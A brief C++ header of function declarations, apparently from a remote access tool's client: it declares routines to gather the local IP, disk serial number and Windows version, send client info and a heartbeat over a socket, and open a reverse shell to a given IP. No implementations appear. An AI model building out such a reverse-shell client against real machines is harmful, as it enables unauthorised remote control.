#pragma once

#include "headers.h"

string getLocalIP();

void checkHeartBeat(SOCKET s);

string getHDDSerialNumber();

string getWindowsVersion();

void sendClientInfo(SOCKET s);

void revShell(char* ip);
